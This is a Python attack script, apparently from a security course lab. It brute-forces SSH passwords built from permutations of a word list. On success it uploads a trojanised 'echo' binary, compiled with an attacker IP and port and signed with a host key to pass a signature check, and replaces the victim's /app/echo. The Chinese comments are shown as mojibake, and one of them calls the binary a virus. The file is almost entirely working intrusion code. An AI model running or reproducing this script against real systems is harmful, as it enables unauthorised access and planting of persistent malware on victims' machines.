#!/usr/bin/env python3
import itertools
import paramiko
import sys
import time
import subprocess

# ç¢ºä¿æä¾› 3 å€‹åƒæ•¸
if len(sys.argv) != 4:
    print("Usage: ./crack_attack <Victim IP> <Attacker IP> <Attacker port>")
    sys.exit(1)

victim_ip = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = int(sys.argv[3])
username = "csc2025"

# è®€å– victim.dat
with open("/app/victim.dat", "r") as f:
    words = [line.strip() for line in f.readlines()]

# ç”¢ç”Ÿå¯èƒ½çš„å¯†ç¢¼çµ„åˆ
password_list = []
for i in range(1, len(words) + 1):
    password_list.extend(["".join(combo) for combo in itertools.permutations(words, i)])

# å˜—è©¦ SSH é€£ç·šï¼ˆåŠ å…¥ Retry æ©Ÿåˆ¶ï¼‰
def try_ssh(password, retries=3):
    for attempt in range(retries):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(victim_ip, username=username, password=password, timeout=2)

            print(f"âœ” æˆåŠŸç™»å…¥ï¼å¯†ç¢¼æ˜¯ï¼š{password}")

            push_echo(client)

            client.close()
            exit(0)  # **æ‰¾åˆ°å¯†ç¢¼å¾Œç«‹å³é€€å‡º**
        
        except paramiko.ssh_exception.AuthenticationException:
            print(f"âŒ å¯†ç¢¼éŒ¯èª¤ï¼Œè·³éå¯†ç¢¼ï¼š{password}")
            return  # **å¯†ç¢¼éŒ¯èª¤ï¼Œç›´æ¥è·³éï¼Œä¸é‡è©¦**
        
        except (paramiko.ssh_exception.SSHException, EOFError):
            print(f"âš  SSH é€£ç·šéŒ¯èª¤ï¼Œé‡è©¦ï¼ˆ{attempt+1}/{retries}ï¼‰...")
            time.sleep(1)  # **çŸ­æš«ç­‰å¾…å¾Œé‡è©¦**
        
        except Exception as e:
            print(f"âš  æœªçŸ¥éŒ¯èª¤ï¼š{e}")
            return  # **å¦‚æœæ˜¯æœªçŸ¥éŒ¯èª¤ï¼Œå°±ç›´æ¥è·³é**


def prepare_echo(attacker_ip, attacker_port):
    private_key_path = "/app/certs/host.key"

    # è¤‡è£½ echo ä¸¦å£“ç¸®ã€è½‰æ›æˆ C å¯ä»¥è™•ç†çš„æ•¸æ“š
    subprocess.run(["cp", "/usr/bin/echo", "orin_echo"], check=True)
    subprocess.run("gzip -c orin_echo > echo.gz", shell=True, check=True)
    subprocess.run("xxd -i echo.gz > echo_gz.h", shell=True, check=True)

    # ç·¨è­¯ echo.c
    compile_cmd = f"gcc -o echo echo.c -DATTACKER_IP='\"{attacker_ip}\"' -DATTACKER_PORT={attacker_port}"
    subprocess.run(compile_cmd, shell=True, check=True)

    # èª¿æ•´å¤§å°ã€é™„ä¸Šç°½å
    subprocess.run("truncate -s $((35208 - 512)) echo", shell=True, check=True)
    subprocess.run(f"openssl dgst -sha3-512 -sign {private_key_path} -out signature echo", shell=True, check=True)
    subprocess.run("tail -c 512 signature >> echo", shell=True, check=True)


# **ğŸ¦  åµŒå…¥å£“ç¸®ç—…æ¯’åˆ° echo**
def push_echo(client):

    # æŠŠechoå‚³çµ¦victim
    sftp = client.open_sftp()
    sftp.put("echo", "/app/echo")
    sftp.close()

    client.exec_command("chmod +x /app/echo")
    
    print(f"âœ” å·²æˆåŠŸä¸Šå‚³ ")


prepare_echo(attacker_ip, attacker_port)

print("é–‹å§‹æ”»æ“Š...")
for password in password_list:
    print(f"å˜—è©¦å¯†ç¢¼ï¼š{password}")
    try_ssh(password)

print("âŒ æœªæ‰¾åˆ°å¯†ç¢¼")

